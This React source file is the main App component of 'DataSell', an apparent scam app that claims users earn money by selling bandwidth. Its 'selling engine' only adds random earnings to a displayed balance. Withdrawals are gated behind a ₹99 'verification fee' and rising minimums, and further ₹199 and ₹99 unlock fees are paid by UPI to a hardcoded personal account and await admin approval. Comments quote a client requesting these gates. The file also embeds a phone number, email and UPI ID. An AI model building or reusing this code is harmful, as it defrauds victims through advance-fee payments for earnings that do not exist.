/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  AppView, 
  DataPacket, 
  UserState, 
  WithdrawalRecord, 
  TopEarner, 
  UserAccount, 
  AuthLog, 
  DepositRecord,
  SupportConfig,
  DepositGatewayConfig,
  SupportTicket,
  SystemConfig,
  AdItem
} from './types';
import { Header } from './components/Header';
import { NavigationDrawer } from './components/NavigationDrawer';
import { DashboardView } from './components/DashboardView';
import { WithdrawView } from './components/WithdrawView';
import { DepositView } from './components/DepositView';
import { WithdrawalHistoryView } from './components/WithdrawalHistoryView';
import { ProfileView } from './components/ProfileView';
import { SupportView } from './components/SupportView';
import { TermsView } from './components/TermsView';
import { LeaderboardView } from './components/LeaderboardView';
import { AdminPanel } from './components/AdminPanel';
import { AuthModal } from './components/AuthModal';
import { BottomNavBar } from './components/BottomNavBar';
import { WatchAdsModal } from './components/WatchAdsModal';
import { PaymentVerificationModal } from './components/PaymentVerificationModal';
import { 
  INITIAL_TOP_EARNERS, 
  INITIAL_USERS, 
  INITIAL_AUTH_LOGS, 
  INITIAL_DEPOSITS, 
  INITIAL_WITHDRAWALS 
} from './initialData';
import { formatTimeAmPm, formatDateTime, generateOrderNumber, calculateTier } from './utils';
import { api } from './api';
import { Bell, CheckCircle2 } from 'lucide-react';

const DEFAULT_SYSTEM_CONFIG: SystemConfig = {
  sellingSpeedMs: 4500, // Slow, steady bandwidth streaming ("data selling thoda or slow kar dijiye sir")
  mbPerPacketMin: 0.15,
  mbPerPacketMax: 0.45,
  ratePerMb: 1.00,
  broadcastNotice: '',
  adRewardAmount: 5.00,
  dailyAdLimit: 10,
};

const DEFAULT_SUPPORT_CONFIG: SupportConfig = {
  whatsappNumber: '+91 9823537634',
  email: 'techreal8806@gmail.com',
  telegramLink: 'https://t.me/datasell_official',
  telegramHandle: '@datasell_official',
  notice: 'Our priority support desk is available 24/7 for deposit, withdrawal, and bandwidth assistance.',
};

const DEFAULT_DEPOSIT_GATEWAY: DepositGatewayConfig = {
  upiId: 'techreal8806@oksbi',
  payeeName: 'DataSell Verified Hub',
  minDeposit: 99,
  allowDirectDeposit: true,
  instructions: 'Scan the QR code using any UPI app (PhonePe, GPay, Paytm). Complete transfer and submit your 12-digit UTR reference number for instant verification.',
};

const DEFAULT_USER_STATE: UserState = {
  email: 'techreal8806@gmail.com',
  name: 'Tech Real',
  phone: '+91 9823537634',
  balance: 0.00,
  totalSoldMB: 0.00,
  isSelling: false,
  tier: 'BRONZE',
  savedUpiId: 'techreal8806@oksbi',
  selectedPaymentMethod: 'PhonePe',
  hasPaidAdsActivation: false,
  hasPaidWithdrawalFee: false,
  hasPaidSpeedTurbo: false,
  withdrawalCount: 0,
};

export default function App() {
  const [currentView, setCurrentView] = useState<AppView>('dashboard');
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  // Rewarded Video Ads State
  const [isWatchAdsOpen, setIsWatchAdsOpen] = useState(false);
  const [selectedAd, setSelectedAd] = useState<AdItem | null>(null);
  const [adsWatchedCount, setAdsWatchedCount] = useState<number>(() => {
    try {
      return parseInt(localStorage.getItem('datasell_ads_watched') || '0', 10);
    } catch {
      return 0;
    }
  });

  // Modal for ₹199 Ads Activation, ₹99 Withdrawal Verification, or ₹99 5G Speed Turbo
  const [paymentModal, setPaymentModal] = useState<{
    isOpen: boolean;
    type: 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99';
  }>({
    isOpen: false,
    type: 'ADS_199',
  });

  // User authentication state: require signup/login before accessing app
  const [isLoggedIn, setIsLoggedIn] = useState<boolean>(() => {
    try {
      return localStorage.getItem('datasell_is_logged_in') === 'true';
    } catch (e) {
      console.error(e);
      return false;
    }
  });

  // 1. System Config
  const [systemConfig, setSystemConfig] = useState<SystemConfig>(() => {
    try {
      const saved = localStorage.getItem('datasell_system_config');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_SYSTEM_CONFIG;
  });

  // 2. Registered Users database
  const [users, setUsers] = useState<UserAccount[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_users_list');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_USERS;
  });

  // 3. Active User State
  const [userState, setUserState] = useState<UserState>(() => {
    try {
      const saved = localStorage.getItem('datasell_user_state');
      if (saved) {
        const parsed = JSON.parse(saved);
        return { ...DEFAULT_USER_STATE, ...parsed };
      }
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_USER_STATE;
  });

  // 4. Top 1-10 High Earners
  const [topEarners, setTopEarners] = useState<TopEarner[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_top_earners');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_TOP_EARNERS;
  });

  // 5. Auth Logs
  const [authLogs, setAuthLogs] = useState<AuthLog[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_auth_logs');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_AUTH_LOGS;
  });

  // 6. Deposits
  const [deposits, setDeposits] = useState<DepositRecord[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_deposits');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_DEPOSITS;
  });

  // 7. Data Packets
  const [packets, setPackets] = useState<DataPacket[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_packets');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return [];
  });

  // 8. Withdrawals
  const [withdrawals, setWithdrawals] = useState<WithdrawalRecord[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_withdrawals');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_WITHDRAWALS;
  });

  // 9. Support & Telegram Config
  const [supportConfig, setSupportConfig] = useState<SupportConfig>(() => {
    try {
      const saved = localStorage.getItem('datasell_support_config');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_SUPPORT_CONFIG;
  });

  // 10. Deposit Gateway Config
  const [depositConfig, setDepositConfig] = useState<DepositGatewayConfig>(() => {
    try {
      const saved = localStorage.getItem('datasell_deposit_config');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_DEPOSIT_GATEWAY;
  });

  // 11. Support Tickets
  const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_support_tickets');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return [];
  });

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3500);
  };

  // Synchronize with Central Server on mount & periodically every 4s
  const syncWithServer = async () => {
    if (!userState.email) return;
    try {
      const data = await api.syncUser(userState.email);
      if (data) {
        if (data.systemConfig) setSystemConfig(data.systemConfig);
        if (data.depositConfig) setDepositConfig(data.depositConfig);
        if (data.supportConfig) setSupportConfig(data.supportConfig);
        if (data.topEarners) setTopEarners(data.topEarners);
        if (data.user) {
          setUserState((prev) => ({
            ...prev,
            id: data.user.id || prev.id,
            name: data.user.name !== undefined ? data.user.name : prev.name,
            phone: data.user.phone !== undefined ? data.user.phone : prev.phone,
            password: data.user.password !== undefined ? data.user.password : prev.password,
            balance: typeof data.user.balance === 'number' ? data.user.balance : (parseFloat(data.user.balance) || prev.balance),
            totalSoldMB: typeof data.user.totalSoldMB === 'number' ? data.user.totalSoldMB : (parseFloat(data.user.totalSoldMB) || prev.totalSoldMB),
            tier: data.user.tier || prev.tier,
            status: data.user.status || prev.status,
            savedUpiId: data.user.savedUpiId !== undefined ? data.user.savedUpiId : prev.savedUpiId,
            selectedPaymentMethod: data.user.selectedPaymentMethod || prev.selectedPaymentMethod,
            requireDepositBeforeWithdrawal: data.user.requireDepositBeforeWithdrawal,
            requiredDepositAmount: data.user.requiredDepositAmount,
            hasCompletedRequiredDeposit: data.user.hasCompletedRequiredDeposit,
            hasPaidAdsActivation: data.user.hasPaidAdsActivation ?? false,
            adsActivationUtr: data.user.adsActivationUtr,
            adsActivationPending: data.user.adsActivationPending ?? false,
            hasPaidWithdrawalFee: data.user.hasPaidWithdrawalFee ?? false,
            withdrawalFeeUtr: data.user.withdrawalFeeUtr,
            withdrawalFeePending: data.user.withdrawalFeePending ?? false,
            hasPaidSpeedTurbo: data.user.hasPaidSpeedTurbo ?? false,
            speedTurboUtr: data.user.speedTurboUtr,
            speedTurboPending: data.user.speedTurboPending ?? false,
            withdrawalCount: data.user.withdrawalCount !== undefined ? data.user.withdrawalCount : prev.withdrawalCount,
          }));
        }
        if (data.withdrawals) {
          setWithdrawals((prev) => {
            const serverMap = new Map(data.withdrawals.map((w: any) => [w.id, w]));
            const updated = prev.map((w) => (serverMap.has(w.id) ? (serverMap.get(w.id) as WithdrawalRecord) : w));
            for (const sw of data.withdrawals) {
              if (!updated.some((u) => u.id === sw.id)) {
                updated.unshift(sw);
              }
            }
            return updated;
          });
        }
      }
    } catch (err) {
      console.warn('Sync error', err);
    }
  };

  useEffect(() => {
    syncWithServer();
    const interval = setInterval(syncWithServer, 4000);
    return () => clearInterval(interval);
  }, [userState.email]);

  // Local storage caches
  useEffect(() => {
    try {
      localStorage.setItem('datasell_users_list', JSON.stringify(users));
      localStorage.setItem('datasell_user_state', JSON.stringify(userState));
      localStorage.setItem('datasell_top_earners', JSON.stringify(topEarners));
      localStorage.setItem('datasell_auth_logs', JSON.stringify(authLogs));
      localStorage.setItem('datasell_deposits', JSON.stringify(deposits));
      localStorage.setItem('datasell_packets', JSON.stringify(packets));
      localStorage.setItem('datasell_withdrawals', JSON.stringify(withdrawals));
      localStorage.setItem('datasell_system_config', JSON.stringify(systemConfig));
      localStorage.setItem('datasell_support_config', JSON.stringify(supportConfig));
      localStorage.setItem('datasell_deposit_config', JSON.stringify(depositConfig));
    } catch (e) {
      console.error(e);
    }
  }, [users, userState, topEarners, authLogs, deposits, packets, withdrawals, systemConfig, supportConfig, depositConfig]);

  // Live Bandwidth Selling Engine with 5G Turbo Boost
  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;

    if (userState.isSelling) {
      // 5G Turbo Speed: 1000ms interval + 0.85-2.25 MB packets for ultra fast selling
      const isTurbo = !!userState.hasPaidSpeedTurbo;
      const speed = isTurbo ? 1000 : (systemConfig.sellingSpeedMs || 4500);

      interval = setInterval(() => {
        const minMb = isTurbo ? 0.85 : (systemConfig.mbPerPacketMin || 0.15);
        const maxMb = isTurbo ? 2.25 : (systemConfig.mbPerPacketMax || 0.45);
        const mbIncrement = parseFloat((Math.random() * (maxMb - minMb) + minMb).toFixed(2));
        const rate = systemConfig.ratePerMb || 1.00;
        const amountIncrement = parseFloat((mbIncrement * rate).toFixed(2));

        const newPacket: DataPacket = {
          id: 'pkt_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
          time: formatTimeAmPm(new Date()),
          mb: mbIncrement,
          amount: amountIncrement,
        };

        setUserState((prev) => {
          const newTotalSold = prev.totalSoldMB + mbIncrement;
          const newBalance = prev.balance + amountIncrement;
          return {
            ...prev,
            totalSoldMB: parseFloat(newTotalSold.toFixed(2)),
            balance: parseFloat(newBalance.toFixed(2)),
            tier: calculateTier(newTotalSold),
          };
        });

        setPackets((prev) => [newPacket, ...prev.slice(0, 49)]);

        api.streamPacket({
          email: userState.email,
          mb: mbIncrement,
          amount: amountIncrement,
        });
      }, speed);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [userState.isSelling, systemConfig.sellingSpeedMs, systemConfig.ratePerMb, userState.email]);

  const handleToggleSelling = () => {
    setUserState((prev) => ({
      ...prev,
      isSelling: !prev.isSelling,
    }));
  };

  // Watch Ads System with ₹199 Payment Gate ("ye ads vala 199 payment ke bad watch ads chale sir utr number bharne ka option add kar dijiyega sir")
  const handleOpenWatchAd = (ad: AdItem) => {
    if (!userState.hasPaidAdsActivation) {
      setPaymentModal({ isOpen: true, type: 'ADS_199' });
      return;
    }
    setSelectedAd(ad);
    setIsWatchAdsOpen(true);
  };

  const handleRewardEarned = async (rewardAmount: number, ad: AdItem) => {
    setUserState((prev) => ({
      ...prev,
      balance: parseFloat((prev.balance + rewardAmount).toFixed(2)),
    }));

    setAdsWatchedCount((prev) => {
      const next = prev + 1;
      localStorage.setItem('datasell_ads_watched', next.toString());
      return next;
    });

    showToast(`🎉 ₹${rewardAmount.toFixed(2)} Cash Credited for watching ${ad.title}!`);

    await api.claimAdReward({
      email: userState.email,
      rewardAmount: rewardAmount,
      adId: ad.id,
      adTitle: ad.title,
    });
  };

  // Submit UTR for ₹199 Ads Activation, ₹99 Withdrawal Verification Fee, or ₹99 Speed Turbo Boost
  const handleSubmitPaymentUtr = async (amount: number, utr: string, type: 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99') => {
    let note = '';
    if (type === 'ADS_199') {
      note = '₹199 Video Ads Lifetime Activation';
      setUserState((prev) => ({
        ...prev,
        adsActivationPending: true,
        adsActivationUtr: utr,
      }));
      showToast(`⏳ ₹${amount} Ads Payment Submitted (UTR: ${utr})! Status: PENDING Admin Approval.`);
    } else if (type === 'WITHDRAWAL_99') {
      note = '₹99 Payout Security Verification Fee';
      setUserState((prev) => ({
        ...prev,
        withdrawalFeePending: true,
        withdrawalFeeUtr: utr,
      }));
      showToast(`⏳ ₹${amount} Verification Fee Submitted (UTR: ${utr})! Status: PENDING Admin Approval.`);
    } else if (type === 'SPEED_TURBO_99') {
      note = '₹99 5G Turbo Speed Selling Boost';
      setUserState((prev) => ({
        ...prev,
        speedTurboPending: true,
        speedTurboUtr: utr,
      }));
      showToast(`⏳ ₹${amount} 5G Turbo Submitted (UTR: ${utr})! Status: PENDING Admin Approval.`);
    }

    const now = new Date().toLocaleString('en-IN', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    });

    const newDep: DepositRecord = {
      id: 'dep_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      userId: userState.id || 'usr_' + Date.now(),
      userEmail: userState.email,
      amount: amount,
      type: 'UPI_DEPOSIT',
      note: `${note} (UTR: ${utr})`,
      time: now,
      status: 'PENDING',
      utrNumber: utr,
      method: 'UPI',
    };

    setDeposits((prev) => [newDep, ...prev]);

    await api.submitDeposit({
      userId: userState.id,
      userEmail: userState.email,
      amount: amount,
      type: 'UPI_DEPOSIT',
      note: `${note} (UTR: ${utr})`,
      utrNumber: utr,
      method: 'UPI',
    });
  };

  // Submit withdrawal request across all mobiles
  const handleSubmitWithdrawal = async (
    amount: number,
    upiId: string,
    method: 'PhonePe' | 'GPay' | 'UPI'
  ): Promise<boolean> => {
    if (amount > userState.balance) return false;

    // ₹99 verification fee gate ("withdrawal ke pahle 99 ka payment add kar dijiye sir , utr number bharne ka option add kar dijiyega sir")
    if (!userState.hasPaidWithdrawalFee) {
      setPaymentModal({ isOpen: true, type: 'WITHDRAWAL_99' });
      return false;
    }

    // "withdrawal 250 first bar , dusra bar 500 add kar dijiye sir"
    const userWithdrawals = withdrawals.filter((w) => w.userEmail?.toLowerCase() === userState.email.toLowerCase());
    const count = userState.withdrawalCount ?? userWithdrawals.length;
    const minAmount = count === 0 ? 250 : 500;
    if (amount < minAmount) {
      showToast(`Minimum withdrawal is ₹${minAmount} for ${count === 0 ? '1st' : '2nd+'} payout!`);
      return false;
    }

    const orderNumber = generateOrderNumber();
    const newRecord: WithdrawalRecord = {
      id: 'wd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      userId: userState.id || 'usr_' + Date.now(),
      userEmail: userState.email,
      orderNumber: orderNumber,
      amount: amount,
      type: method,
      upiId: upiId,
      time: formatDateTime(new Date()),
      status: 'PENDING',
    };

    setUserState((prev) => ({
      ...prev,
      balance: parseFloat((prev.balance - amount).toFixed(2)),
      savedUpiId: upiId,
      selectedPaymentMethod: method,
      withdrawalCount: (prev.withdrawalCount ?? count) + 1,
    }));

    setWithdrawals((prev) => [newRecord, ...prev]);
    showToast(`Withdrawal requested! Order ${orderNumber} queued for UPI settlement.`);

    await api.requestWithdrawal({
      userId: userState.id,
      userEmail: userState.email,
      amount: amount,
      method: method,
      upiId: upiId,
      orderNumber: orderNumber,
    });

    return true;
  };

  const handleApproveRecord = (id: string) => {
    setWithdrawals((prev) =>
      prev.map((rec) => (rec.id === id ? { ...rec, status: 'SUCCESSFUL' } : rec))
    );
  };

  const handleUpdateProfile = (updated: Partial<UserState>) => {
    setUserState((prev) => ({ ...prev, ...updated }));
  };

  const handleAuthSuccess = async (account: UserAccount, authLog: AuthLog, isNewSignup: boolean = false) => {
    if (isNewSignup) {
      setPackets([]);
      setWithdrawals((prev) => prev.filter((w) => w.userEmail?.toLowerCase() === account.email.toLowerCase()));
      setDeposits((prev) => prev.filter((d) => d.userEmail?.toLowerCase() === account.email.toLowerCase()));
      showToast('🎉 Account registered successfully! Welcome to DataSell.');
    } else {
      showToast(`Welcome back, ${account.name}!`);
    }

    setAuthLogs((prev) => [authLog, ...prev]);
    setUsers((prev) => {
      const exists = prev.some((u) => u.id === account.id || u.email.toLowerCase() === account.email.toLowerCase());
      if (exists) {
        return prev.map((u) => (u.id === account.id ? account : u));
      }
      return [account, ...prev];
    });

    setUserState({
      id: account.id,
      email: account.email,
      name: account.name,
      phone: account.phone,
      balance: account.balance,
      totalSoldMB: account.totalSoldMB,
      isSelling: false,
      tier: account.tier,
      savedUpiId: account.savedUpiId,
      selectedPaymentMethod: account.selectedPaymentMethod,
      status: account.status,
      requireDepositBeforeWithdrawal: account.requireDepositBeforeWithdrawal,
      requiredDepositAmount: account.requiredDepositAmount,
      hasCompletedRequiredDeposit: account.hasCompletedRequiredDeposit,
      hasPaidAdsActivation: account.hasPaidAdsActivation ?? false,
      adsActivationUtr: account.adsActivationUtr,
      hasPaidWithdrawalFee: account.hasPaidWithdrawalFee ?? false,
      withdrawalFeeUtr: account.withdrawalFeeUtr,
      hasPaidSpeedTurbo: account.hasPaidSpeedTurbo ?? false,
      speedTurboUtr: account.speedTurboUtr,
      withdrawalCount: account.withdrawalCount ?? 0,
    });

    setIsLoggedIn(true);
    try {
      localStorage.setItem('datasell_is_logged_in', 'true');
    } catch (e) {
      console.error(e);
    }
    setIsAuthModalOpen(false);

    if (isNewSignup) {
      await api.signup({
        email: account.email,
        password: account.password,
        name: account.name,
        phone: account.phone,
        device: account.device,
      });
    } else {
      await api.login({
        email: account.email,
        password: account.password,
        device: account.device,
      });
    }
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    try {
      localStorage.removeItem('datasell_is_logged_in');
    } catch (e) {
      console.error(e);
    }
    setIsMenuOpen(false);
    setCurrentView('dashboard');
  };

  const handleAddDeposit = async (newDep: DepositRecord) => {
    setDeposits((prev) => [newDep, ...prev]);
    showToast('Deposit submitted for verification.');

    await api.submitDeposit({
      userId: newDep.userId,
      userEmail: newDep.userEmail,
      amount: newDep.amount,
      type: newDep.type,
      note: newDep.note,
      utrNumber: newDep.utrNumber,
      method: newDep.method,
    });
  };

  const handleResetToZero = () => {
    if (window.confirm('Reset all balance, MB sold, and history back to 0?')) {
      const resetState: UserState = {
        ...DEFAULT_USER_STATE,
        balance: 0.00,
        totalSoldMB: 0.00,
        isSelling: false,
      };
      setUserState(resetState);
      setPackets([]);
      localStorage.removeItem('datasell_user_state');
      localStorage.removeItem('datasell_packets');
    }
  };

  const handleAdminUpdateUsers = (updatedUsers: UserAccount[]) => {
    setUsers(updatedUsers);
    // If the active logged in user was modified in the admin panel, immediately update active userState too!
    const active = updatedUsers.find((u) => u.email.toLowerCase() === userState.email.toLowerCase());
    if (active) {
      setUserState((prev) => ({
        ...prev,
        ...active,
      }));
    }
  };

  // Dedicated full-width Admin Panel View
  if (currentView === 'admin') {
    return (
      <AdminPanel
        onBackToUserView={() => setCurrentView('dashboard')}
        users={users}
        onUpdateUsers={handleAdminUpdateUsers}
        withdrawals={withdrawals}
        onUpdateWithdrawals={setWithdrawals}
        topEarners={topEarners}
        onUpdateTopEarners={setTopEarners}
        authLogs={authLogs}
        onClearLogs={() => setAuthLogs([])}
        deposits={deposits}
        onAddDeposit={handleAddDeposit}
        onUpdateDeposits={setDeposits}
        supportConfig={supportConfig}
        onUpdateSupportConfig={setSupportConfig}
        supportTickets={supportTickets}
        onUpdateTickets={setSupportTickets}
        depositConfig={depositConfig}
        onUpdateDepositConfig={setDepositConfig}
        systemConfig={systemConfig}
        onUpdateSystemConfig={setSystemConfig}
      />
    );
  }

  // Mandatory Sign Up / Login Screen
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-amber-50 via-slate-50 to-red-50 flex flex-col items-center justify-center p-4 relative overflow-hidden">
        <div className="absolute top-1/3 left-1/2 -translate-x-1/2 w-96 h-96 bg-red-300/30 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-amber-300/30 rounded-full blur-3xl pointer-events-none" />

        <AuthModal
          isOpen={true}
          canClose={false}
          onClose={() => {}}
          onAuthSuccess={handleAuthSuccess}
          onAdminAuthSuccess={() => {
            setCurrentView('admin');
          }}
          existingUsers={users}
          initialMode="SIGNUP"
          isFirstTime={true}
        />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-amber-50/50 via-slate-50 to-red-50/40 flex flex-col items-center justify-start antialiased text-slate-800 relative overflow-x-hidden selection:bg-red-500/20 selection:text-red-900">
      
      {/* Toast Notification Alert */}
      {toastMessage && (
        <div className="fixed top-4 left-1/2 -translate-x-1/2 z-50 bg-gradient-to-r from-red-600 to-amber-500 text-white px-4 py-2.5 rounded-2xl shadow-xl border border-yellow-300 text-xs font-black flex items-center gap-2 animate-in fade-in slide-in-from-top-3 duration-200">
          <CheckCircle2 className="w-4 h-4 text-yellow-300 shrink-0" />
          <span>{toastMessage}</span>
        </div>
      )}

      {/* Ambient background glows in Red & Gold */}
      <div className="fixed top-0 left-1/2 -translate-x-1/2 w-[800px] h-[500px] bg-gradient-to-b from-red-300/20 via-amber-200/20 to-transparent blur-3xl pointer-events-none rounded-full" />
      <div className="fixed bottom-0 right-10 w-[400px] h-[400px] bg-amber-200/25 blur-3xl pointer-events-none rounded-full" />

      {/* Container simulating smartphone app frame - STATUS BAR AND LOWER SUB-BAR REMOVED AS REQUESTED */}
      <div className="w-full max-w-md min-h-screen sm:min-h-[94vh] sm:my-4 sm:rounded-[36px] bg-white sm:border-2 sm:border-amber-300 sm:shadow-2xl sm:shadow-red-600/10 flex flex-col relative pb-8 overflow-hidden z-10">
        
        {/* Global Broadcast Announcement from Admin if active */}
        {systemConfig.broadcastNotice && (
          <div className="bg-gradient-to-r from-red-600 via-rose-600 to-amber-500 text-white px-4 py-2 text-xs font-black flex items-center gap-2 shadow-xs">
            <Bell className="w-3.5 h-3.5 shrink-0 animate-bounce text-yellow-300" />
            <span className="truncate">{systemConfig.broadcastNotice}</span>
          </div>
        )}

        {/* Top Header in Red & Yellow Theme */}
        <Header
          onOpenMenu={() => setIsMenuOpen(true)}
          isSelling={userState.isSelling}
          onReset={handleResetToZero}
          onOpenLeaderboard={() => setCurrentView('leaderboard')}
          onOpenAuth={() => setIsAuthModalOpen(true)}
          userEmail={userState.email}
        />

        {/* Side Navigation Drawer */}
        <NavigationDrawer
          isOpen={isMenuOpen}
          onClose={() => setIsMenuOpen(false)}
          currentView={currentView}
          onSelectView={(view) => setCurrentView(view)}
          userEmail={userState.email}
          onLogout={handleLogout}
          onOpenAuth={() => setIsAuthModalOpen(true)}
          telegramLink={supportConfig.telegramLink}
          onOpenAdmin={() => setCurrentView('admin')}
        />

        {/* Main Content Area based on current view */}
        <main className="flex-1">
          {currentView === 'dashboard' && (
            <DashboardView
              userState={userState}
              onToggleSelling={handleToggleSelling}
              packets={packets}
              onOpenWithdraw={() => setCurrentView('withdraw')}
              onOpenDeposit={() => setCurrentView('deposit')}
              topEarners={topEarners}
              onOpenLeaderboard={() => setCurrentView('leaderboard')}
              onWatchAd={handleOpenWatchAd}
              adsWatchedToday={adsWatchedCount}
              dailyAdLimit={systemConfig.dailyAdLimit || 10}
              onOpenUnlockAds={() => setPaymentModal({ isOpen: true, type: 'ADS_199' })}
              onOpenWithdrawalFeeModal={() => setPaymentModal({ isOpen: true, type: 'WITHDRAWAL_99' })}
              onOpenSpeedTurboModal={() => setPaymentModal({ isOpen: true, type: 'SPEED_TURBO_99' })}
            />
          )}

          {currentView === 'leaderboard' && (
            <LeaderboardView
              topEarners={topEarners}
              onBack={() => setCurrentView('dashboard')}
              currentUserEmail={userState.email}
            />
          )}

          {currentView === 'withdraw' && (
            <WithdrawView
              userState={userState}
              onBack={() => setCurrentView('dashboard')}
              onSubmitWithdrawal={handleSubmitWithdrawal}
              onGoToHistory={() => setCurrentView('history')}
              onOpenDeposit={() => setCurrentView('deposit')}
              onOpenWithdrawalFeeModal={() => setPaymentModal({ isOpen: true, type: 'WITHDRAWAL_99' })}
              withdrawalCount={userState.withdrawalCount ?? withdrawals.filter((w) => w.userEmail?.toLowerCase() === userState.email.toLowerCase()).length}
            />
          )}

          {currentView === 'deposit' && (
            <DepositView
              userState={userState}
              depositConfig={depositConfig}
              onBack={() => setCurrentView('dashboard')}
              onSubmitDeposit={handleAddDeposit}
              onGoToWithdraw={() => setCurrentView('withdraw')}
            />
          )}

          {currentView === 'history' && (
            <WithdrawalHistoryView
              records={withdrawals}
              currentUserEmail={userState.email}
              onBack={() => setCurrentView('dashboard')}
              onApproveRecord={handleApproveRecord}
            />
          )}

          {currentView === 'profile' && (
            <ProfileView
              userState={userState}
              onBack={() => setCurrentView('dashboard')}
              onUpdateProfile={handleUpdateProfile}
              onOpenAdmin={() => setCurrentView('admin')}
              onLogout={handleLogout}
            />
          )}

          {currentView === 'support' && (
            <SupportView 
              onBack={() => setCurrentView('dashboard')} 
              supportConfig={supportConfig}
              userEmail={userState.email}
              onAddTicket={(ticket) => setSupportTickets((prev) => [ticket, ...prev])}
            />
          )}

          {currentView === 'terms' && (
            <TermsView onBack={() => setCurrentView('dashboard')} />
          )}
        </main>

        {/* Bottom Ergonomic Navigation Bar in Red & Yellow Theme */}
        <BottomNavBar
          currentView={currentView}
          onSelectView={(view) => setCurrentView(view)}
        />
      </div>

      {/* Payment Verification Modal for ₹199 (Ads), ₹99 (Withdrawal), and ₹99 (Speed Turbo) with Top Cancel Option */}
      <PaymentVerificationModal
        isOpen={paymentModal.isOpen}
        onClose={() => setPaymentModal({ ...paymentModal, isOpen: false })}
        type={paymentModal.type}
        depositConfig={depositConfig}
        onSubmitUtr={handleSubmitPaymentUtr}
        userEmail={userState.email}
        isPending={
          paymentModal.type === 'ADS_199'
            ? userState.adsActivationPending
            : paymentModal.type === 'WITHDRAWAL_99'
            ? userState.withdrawalFeePending
            : userState.speedTurboPending
        }
        pendingUtr={
          paymentModal.type === 'ADS_199'
            ? userState.adsActivationUtr
            : paymentModal.type === 'WITHDRAWAL_99'
            ? userState.withdrawalFeeUtr
            : userState.speedTurboUtr
        }
      />

      {/* Rewarded Video Ads Modal */}
      <WatchAdsModal
        isOpen={isWatchAdsOpen}
        onClose={() => setIsWatchAdsOpen(false)}
        selectedAd={selectedAd}
        onRewardEarned={handleRewardEarned}
      />

      {/* Auth Modal for Login & Signup */}
      <AuthModal
        isOpen={isAuthModalOpen}
        canClose={true}
        onClose={() => setIsAuthModalOpen(false)}
        onAuthSuccess={handleAuthSuccess}
        onAdminAuthSuccess={() => {
          setIsAuthModalOpen(false);
          setCurrentView('admin');
        }}
        existingUsers={users}
        initialMode="LOGIN"
        isFirstTime={false}
      />
    </div>
  );
}
